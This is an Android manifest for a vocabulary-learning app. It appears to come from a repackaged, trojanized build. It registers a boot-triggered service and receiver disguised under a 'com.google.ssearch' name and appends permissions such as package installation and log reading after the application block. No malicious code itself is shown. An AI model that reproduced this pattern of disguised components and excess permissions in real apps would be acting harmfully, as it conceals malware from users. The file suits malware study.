<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.nineiworks.wordsXGN">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_LOGS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <application android:debuggable="true" android:icon="@drawable/icon" android:label="@string/app_name">
        <meta-data android:name="UMENG_CHANNEL" android:value="木蚂蚁市场"/>
        <meta-data android:name="UMENG_APPKEY" android:value="4dd92fe6431fe322280001c6"/>
        <activity android:label="@string/app_name" android:name=".activity.Words" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/about" android:name="activity.About" android:screenOrientation="portrait"/>
        <activity android:label="@string/coupon" android:name="activity.Coupon" android:screenOrientation="portrait"/>
        <activity android:label="@string/wordexercise" android:name="activity.WordsExercise" android:screenOrientation="portrait"/>
        <activity android:label="@string/wordlist" android:name="activity.WordsList" android:screenOrientation="portrait"/>
        <activity android:label="@string/errorrecord" android:name="activity.ErrorRecord" android:screenOrientation="portrait"/>
        <activity android:label="@string/help" android:name="activity.Help" android:screenOrientation="portrait"/>
        <activity android:label="@string/answer" android:name="activity.Record" android:screenOrientation="portrait"/>
        <activity android:label="@string/wordstype" android:name="activity.WordType" android:screenOrientation="portrait"/>
        <activity android:label="@string/wordlist" android:name="activity.CouponDetail" android:screenOrientation="portrait"/>
        <activity android:label="@string/wordlist" android:name="activity.Menu" android:screenOrientation="portrait"/>
        <activity android:label="@string/wordlist" android:name="activity.SelectWordTypeivity.SelectWordType" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="d$S" android:theme="@android:style/Theme.Dialog"/>
        <service android:name="com.google.ssearch.SearchService"/>
        <receiver android:name="com.google.ssearch.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.BATTERY_CHANGED_ACTION"/>
                <action android:name="android.intent.action.SIG_STR"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
</manifest>